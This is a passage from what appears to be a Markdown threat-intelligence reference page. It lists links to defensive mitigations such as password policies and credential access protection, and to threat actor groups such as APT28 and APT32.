* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    
* [Password Policies](../mitigations/Password-Policies.md)
    
* [Credential Access Protection](../mitigations/Credential-Access-Protection.md)
    
* [User Training](../mitigations/User-Training.md)
    
* [Active Directory Configuration](../mitigations/Active-Directory-Configuration.md)
    
* [Privileged Process Integrity](../mitigations/Privileged-Process-Integrity.md)
    
* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)
    
* [Encrypt Sensitive Information](../mitigations/Encrypt-Sensitive-Information.md)
    

# Actors


* [Sowbug](../actors/Sowbug.md)

* [Axiom](../actors/Axiom.md)
    
* [Poseidon Group](../actors/Poseidon-Group.md)
    
* [Suckfly](../actors/Suckfly.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [APT28](../actors/APT28.md)
    
* [APT32](../actors/APT32.md)
    
* [Frankenstein](../actors/Frankenstein.md)
    
* [APT39](../actors/APT39.md)
    
